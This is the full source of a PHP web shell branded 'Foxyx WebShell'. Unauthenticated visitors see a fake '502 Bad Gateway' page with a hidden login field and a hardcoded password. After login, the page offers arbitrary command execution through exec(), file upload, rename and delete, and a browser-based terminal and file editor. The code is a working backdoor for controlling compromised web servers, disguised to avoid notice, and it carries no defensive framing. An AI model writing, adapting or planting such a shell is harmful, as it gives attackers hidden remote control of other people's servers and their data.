<?php
declare(strict_types=1);
set_time_limit(0);
error_reporting(0);
$cookiePath = dirname($_SERVER['SCRIPT_NAME']) ?: '/';
if (isset($_GET['logout'])) {
    setcookie('auth', '', time() - 3600, $cookiePath, '', false, true);
    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}
$loginSecret  = 'hiddenfoxy';
$cookieName   = 'auth';
$cookieValue  = '1';
$cookieExpire = time() + 30 * 24 * 60 * 60;
if (isset($_POST['login'])) {
    $password = $_POST['password'] ?? '';
    if ($password === $loginSecret) {
        setcookie($cookieName, $cookieValue, $cookieExpire, $cookiePath, '', false, true);
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    }
    $loginError = 'Password salah.';
}
if (!isset($_COOKIE['auth'])) {
    header("HTTP/1.1 403 Forbidden");
    ?>
    <html>
    <head>
        <title>502 Bad Gateway</title>
    </head>
    <body>
        <center>
            <h1>502 Bad Gateway</h1>
        </center>
        <hr>
        <center>openfoxyresty/1.27.1.1</center>
        <!-- Form Login -->
        <center style="margin-top: 40%;">
            <form method="post" action="">
                <input name="password" style="background:white; border:1px solid white; padding:0.5rem;">
                <input type="submit" name="login" value="Login" style="color:white; background:white; border:1px solid white; padding:0.5rem;">
            </form>
            <?php if (isset($loginError)) echo "<div style='color:red;'>" . htmlspecialchars($loginError) . "</div>"; ?>
        </center>
    </body>
    </html>
<?php
    exit();
}
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;
$cwd = __DIR__;
if (isset($_REQUEST['cwd']) && is_dir($_REQUEST['cwd'])) {
    $cwd = realpath($_REQUEST['cwd']);
}
chdir($cwd);
function reply(string $out): never {
    header('Content-Type: text/plain; charset=UTF-8');
    echo rtrim($out, "\r\n") . "\n\n" . getcwd();
    exit;
}
if (isset($_GET['foxy'])) {
    $cmd = $_GET['foxy'];
    if (preg_match('/^\s*cd\s+(.+)$/', $cmd, $m)) {
        $target = $m[1];
        if ($target[0] !== '/') $target = $cwd . DIRECTORY_SEPARATOR . $target;
        if (is_dir($target)) { chdir($target); reply(''); }
        reply("cd: no such directory: {$m[1]}");
    }
    $out = [];
    exec($cmd . ' 2>&1', $out);
    reply(implode("\n", $out));
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    header('Content-Type: text/plain; charset=UTF-8');
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) echo "Uploaded to: {$target}";
    else { http_response_code(500); echo "Upload failed"; }
    exit;
}
if (isset($_REQUEST['old'], $_REQUEST['new'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $ok = rename($cwd . DIRECTORY_SEPARATOR . $_REQUEST['old'], $cwd . DIRECTORY_SEPARATOR . $_REQUEST['new']);
    echo $ok ? "Renamed '{$_REQUEST['old']}' → '{$_REQUEST['new']}'" : (http_response_code(500) && "Rename failed");
    exit;
}
if (isset($_REQUEST['file'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $ok = unlink($cwd . DIRECTORY_SEPARATOR . $_REQUEST['file']);
    echo $ok ? "Deleted '{$_REQUEST['file']}'" : (http_response_code(500) && "Delete failed");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en" class="dark">

<head>
    <meta charset="UTF-8">
    <title>Foxyx WebShell</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
    tailwind.config = {
        theme: {
            extend: {
                colors: {
                    foxOrange: '#ff8c00'
                }
            }
        }
    };
    </script>
    <style>
    ::-webkit-scrollbar {
        width: 8px
    }

    ::-webkit-scrollbar-thumb {
        background: #666;
        border-radius: 9999px;
        border: 2px solid transparent;
        background-clip: padding-box
    }

    ::-webkit-scrollbar-track {
        background: #222
    }

    .icon-orange {
        width: 1.2rem;
        height: 1.2rem;
        filter: invert(48%) sepia(94%) saturate(5214%) hue-rotate(0deg) brightness(101%) contrast(105%)
    }

    .icon-btn {
        background: transparent;
        border: none;
        padding: 0.25rem;
        cursor: pointer
    }
    </style>
</head>

<body class="bg-gray-900 text-gray-100 h-screen w-screen overflow-hidden flex flex-col">
    <header class="bg-gray-800 backdrop-blur-sm bg-opacity-70 p-4 flex items-center justify-center shadow-md">
        <div class="text-xl font-bold text-foxOrange tracking-wide">Foxyx WebShell</div>
    </header>
    <div class="flex flex-1 overflow-hidden">
        <aside class="bg-gray-800/50 backdrop-blur-sm border-r border-gray-700 p-4 overflow-auto" style="width:25rem">
            <h2 class="text-lg font-semibold text-foxOrange mb-3">Files</h2>
            <div class="flex flex-wrap items-center gap-2 mb-4">
                <button id="refresh-btn"
                    class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition">↻</button>
                <button id="upload-btn"
                    class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition">Upload</button>
                <input type="file" id="file-input" class="hidden">
                <button id="newfile-btn"
                    class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition">New
                    File</button>
                <button id="newfolder-btn"
                    class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition">New
                    Folder</button>
                <button id="logout-btn"
                    class="px-3 py-1 bg-foxOrange text-gray-100 font-semibold rounded hover:bg-red-500 transition"><img
                        src="https://cdn-icons-png.flaticon.com/512/15861/15861945.png" class="inline w-4 h-4" alt="Quit"></button>
            </div>
            <ul id="file-list" class="space-y-1 text-sm"></ul>
        </aside>
        <main class="flex-1 overflow-auto p-4">
            <nav id="breadcrumb" class="mb-4 flex items-center space-x-2 text-sm text-gray-400"></nav>
            <section class="mb-8">
                <h2 class="text-lg font-semibold text-foxOrange mb-2">Editor</h2>
                <textarea id="editor"
                    class="w-full p-2 bg-gray-800 text-gray-100 rounded focus:outline-none focus:ring-2 focus:ring-orange-500 resize-vertical"
                    style="height:30vh"></textarea>
                <div class="mt-2"><button id="save-btn"
                        class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition">Save
                        Changes</button></div>
                <div id="edit-status" class="mt-2 text-sm text-gray-400"></div>
            </section>
            <section>
                <h2 class="text-lg font-semibold text-foxOrange mb-2">Terminal</h2>
                <label class="text-sm text-gray-300 flex items-center space-x-2 mb-2"><span>Terminal
                        height:</span><input type="range" id="term-height" min="100" max="600" value="300"
                        class="accent-orange-500 w-52"><span id="term-height-value"
                        class="w-10 text-right">300</span><span>px</span></label>
                <div id="terminal-output" class="bg-black text-green-400 font-mono overflow-auto rounded p-2 mb-2"
                    style="height:300px"></div>
                <div class="bg-black rounded p-1 flex items-center"><span class="text-green-400 mx-1">$</span><input
                        type="text" id="term-input"
                        class="flex-1 bg-transparent border-none outline-none text-green-300 text-sm"
                        placeholder="Type command here..."></div>
            </section>
        </main>
    </div>
    <script>
    const API = '';
    let currentPath = '';
    let currentFile = '';
    let newItemMode = null;
    let renameModeItem = null;
    let termOutput, termInput;

    function init() {
        termOutput = document.getElementById('terminal-output');
        termInput = document.getElementById('term-input');
        setupEvents();
        getPwd();
    }
    init();

    function parseResponse(txt) {
        const parts = txt.split(/\r?\n\r?\n/);
        const cwd = parts.pop().trim();
        return {
            out: parts.join('\n\n'),
            cwd
        };
    }

    function appendTerminal(text) {
        const d = document.createElement('div');
        d.className = 'whitespace-pre';
        d.textContent = text;
        termOutput.appendChild(d);
    }

    function getPwd() {
        fetch('?foxy=pwd').then(r => r.text()).then(t => {
            ({
                cwd: currentPath
            } = parseResponse(t));
            refreshList();
            connectTerminal();
        });
    }

    function connectTerminal() {
        appendTerminal('$ ls -a');
        fetch(`?cwd=${encodeURIComponent(currentPath)}&foxy=ls%20-a`).then(() => appendTerminal(
            '<!-- Terminal Connected -->'));
    }

    function refreshList() {
        fetch(`?cwd=${encodeURIComponent(currentPath)}&foxy=ls%20-1p%20-A`).then(r => r.text()).then(t => {
            const p = parseResponse(t);
            currentPath = p.cwd;
            renderBreadcrumb(currentPath);
            const items = p.out.trim().split('\n');
            const ul = document.getElementById('file-list');
            ul.innerHTML = '';
            if (newItemMode) ul.appendChild(createNewItemRow(newItemMode));
            items.forEach(it => {
                if (it) ul.appendChild(createItemRow(it.endsWith('/') ? it.slice(0, -1) : it, it
                    .endsWith('/')));
            });
        });
    }

    function renderBreadcrumb(path) {
        const bc = document.getElementById('breadcrumb');
        bc.innerHTML = '';
        if (!path) return;
        const parts = path.split('/').filter((p, i) => i === 0 || p);
        let accum = '';
        parts.forEach((seg, i) => {
            if (i) {
                const s = document.createElement('span');
                s.textContent = '/';
                s.className = 'text-gray-500';
                bc.appendChild(s);
            }
            accum = i === 0 && seg === '' ? '/' : accum === '' || accum === '/' ? '/' + seg : accum + '/' + seg;
            const a = document.createElement('a');
            a.textContent = seg === '' ? '/' : seg;
            a.href = '#';
            a.className = 'text-gray-200 hover:underline';
            a.onclick = e => {
                e.preventDefault();
                runSilent(`cd ${accum}`).then(refreshList);
            };
            bc.appendChild(a);
        });
    }

    function runSilent(cmd) {
        return fetch(`?cwd=${encodeURIComponent(currentPath)}&foxy=${encodeURIComponent(cmd)}`).then(r => r.text())
            .then(t => {
                currentPath = parseResponse(t).cwd;
            });
    }

    function createNewItemRow(mode) {
        const li = document.createElement('li');
        li.className = 'flex items-center justify-between bg-gray-800/40 rounded px-2 py-1';
        li.innerHTML =
            `<div class="flex items-center"><img class="icon-orange mr-2" src="${mode==='folder'?'https://www.svgrepo.com/show/436171/close-folder-data.svg':'https://www.svgrepo.com/show/436151/file-file-format-folder.svg'}"><input type="text" class="bg-gray-700 text-gray-200 rounded px-2 py-0.5 w-36 focus:outline-none focus:ring-2 focus:ring-orange-500"></div><div class="flex items-center space-x-2 ml-4"><button class="icon-btn ok"><img src="https://www.svgrepo.com/show/525266/check-square.svg" class="icon-orange"></button><button class="icon-btn cancel"><img src="https://www.svgrepo.com/show/433361/close-f.svg" class="icon-orange"></button></div>`;
        const inp = li.querySelector('input');
        li.querySelector('.ok').onclick = () => {
            const v = inp.value.trim();
            if (!v) return;
            runSilent((mode === 'folder' ? 'mkdir ' : 'touch ') + v).then(() => {
                newItemMode = null;
                refreshList();
            });
        };
        li.querySelector('.cancel').onclick = () => {
            newItemMode = null;
            refreshList();
        };
        return li;
    }

    function createItemRow(name, isFolder) {
        const li = document.createElement('li');
        li.className = 'flex items-center justify-between bg-gray-800/40 rounded px-2 py-1';
        const left = document.createElement('div');
        left.className = 'flex items-center';
        const icon = document.createElement('img');
        icon.className = 'icon-orange mr-2';
        icon.src = isFolder ? 'https://www.svgrepo.com/show/436171/close-folder-data.svg' :
            'https://www.svgrepo.com/show/436151/file-file-format-folder.svg';
        left.appendChild(icon);
        const span = document.createElement('span');
        span.title = name;
        span.textContent = name.length > 25 ? name.slice(0, 25) + '…' : name;
        if (isFolder) {
            span.className = 'text-foxOrange hover:underline cursor-pointer';
            span.onclick = () => runSilent(`cd ${name}`).then(refreshList);
        } else {
            span.className = 'text-gray-200';
        }
        left.appendChild(span);
        li.appendChild(left);
        const act = document.createElement('div');
        act.className = 'flex items-center space-x-2 ml-4';
        if (!isFolder) {
            const ebtn = document.createElement('button');
            ebtn.className = 'icon-btn edit';
            ebtn.innerHTML = '<img src="https://www.svgrepo.com/show/436186/edit-tool-pencil.svg" class="icon-orange">';
            ebtn.onclick = () => {
                currentFile = name;
                loadFile(name);
            };
            act.appendChild(ebtn);
        }
        const dbtn = document.createElement('button');
        dbtn.className = 'icon-btn del';
        dbtn.innerHTML = '<img src="https://www.svgrepo.com/show/436163/delete-trash-remove.svg" class="icon-orange">';
        dbtn.onclick = () => deleteFile(name).then(refreshList);
        act.appendChild(dbtn);
        const rbtn = document.createElement('button');
        rbtn.className = 'icon-btn ren';
        rbtn.innerHTML = '<img src="https://www.svgrepo.com/show/436169/pencil-tool-pen.svg" class="icon-orange">';
        rbtn.onclick = () => {
            renameModeItem = name;
            renderRename(li, name, isFolder);
        };
        act.appendChild(rbtn);
        li.appendChild(act);
        return li;
    }

    function renderRename(li, name, isFolder) {
        li.innerHTML = '';
        const left = document.createElement('div');
        left.className = 'flex items-center';
        const ic = document.createElement('img');
        ic.className = 'icon-orange mr-2';
        ic.src = isFolder ? 'https://www.svgrepo.com/show/436171/close-folder-data.svg' :
            'https://www.svgrepo.com/show/436151/file-file-format-folder.svg';
        left.appendChild(ic);
        const inp = document.createElement('input');
        inp.value = name;
        inp.className =
            'bg-gray-700 text-gray-200 rounded px-2 py-0.5 w-36 focus:outline-none focus:ring-2 focus:ring-orange-500';
        left.appendChild(inp);
        li.appendChild(left);
        const ac = document.createElement('div');
        ac.className = 'flex items-center space-x-2 ml-4';
        const ok = document.createElement('button');
        ok.className = 'icon-btn ok';
        ok.innerHTML = '<img src="https://www.svgrepo.com/show/525266/check-square.svg" class="icon-orange">';
        ok.onclick = () => {
            const v = inp.value.trim();
            if (v && v !== name) renameFile(name, v);
            else refreshList();
        };
        ac.appendChild(ok);
        const cn = document.createElement('button');
        cn.className = 'icon-btn cancel';
        cn.innerHTML = '<img src="https://www.svgrepo.com/show/433361/close-f.svg" class="icon-orange">';
        cn.onclick = () => refreshList();
        ac.appendChild(cn);
        li.appendChild(ac);
    }

    function renameFile(o, n) {
        fetch(`?cwd=${encodeURIComponent(currentPath)}&old=${encodeURIComponent(o)}&new=${encodeURIComponent(n)}`).then(
            () => {
                renameModeItem = null;
                refreshList();
            });
    }

    function deleteFile(n) {
        return fetch(`?cwd=${encodeURIComponent(currentPath)}&file=${encodeURIComponent(n)}`).then(r => r.text());
    }

    function loadFile(fname) {
        fetch(`?cwd=${encodeURIComponent(currentPath)}&foxy=${encodeURIComponent('cat '+fname)}`).then(r => r.text())
            .then(t => {
                document.getElementById('editor').value = parseResponse(t).out;
            });
    }

    function saveFile() {
        if (!currentFile) {
            alert('No file selected');
            return;
        }
        const b = new Blob([document.getElementById('editor').value], {
            type: 'text/plain'
        });
        const fd = new FormData();
        fd.append('cwd', currentPath);
        fd.append('file', b, currentFile);
        fetch('', {
            method: 'POST',
            body: fd
        }).then(r => r.text()).then(() => {
            document.getElementById('edit-status').textContent = 'Saved';
            setTimeout(() => {
                document.getElementById('edit-status').textContent = '';
            }, 3000);
            refreshList();
        });
    }

    function handleCmd(cmd) {
        appendTerminal('$ ' + cmd);
        fetch(`?cwd=${encodeURIComponent(currentPath)}&foxy=${encodeURIComponent(cmd)}`).then(r => r.text()).then(t => {
            const p = parseResponse(t);
            currentPath = p.cwd;
            if (p.out) appendTerminal(p.out);
            refreshList();
            termOutput.scrollTop = termOutput.scrollHeight;
        });
    }

    function setupEvents() {
        const r = document.getElementById('term-height');
        const rv = document.getElementById('term-height-value');
        r.oninput = () => {
            document.getElementById('terminal-output').style.height = r.value + 'px';
            rv.textContent = r.value;
        };
        termInput.addEventListener('keydown', e => {
            if (e.key === 'Enter') {
                e.preventDefault();
                const c = termInput.value.trim();
                if (!c) return;
                termInput.value = '';
                handleCmd(c);
            }
        });
        document.getElementById('refresh-btn').onclick = refreshList;
        document.getElementById('newfile-btn').onclick = () => {
            newItemMode = 'file';
            refreshList();
        };
        document.getElementById('newfolder-btn').onclick = () => {
            newItemMode = 'folder';
            refreshList();
        };
        document.getElementById('logout-btn').onclick = () => {
            window.location = '?logout=1';
        };
        const fi = document.getElementById('file-input');
        document.getElementById('upload-btn').onclick = () => fi.click();
        fi.onchange = () => {
            if (!fi.files.length) return;
            const fd = new FormData();
            fd.append('cwd', currentPath);
            fd.append('file', fi.files[0]);
            fetch('', {
                method: 'POST',
                body: fd
            }).then(() => {
                fi.value = '';
                refreshList();
            });
        };
        document.getElementById('save-btn').onclick = saveFile;
    }
    </script>
</body>

</html>
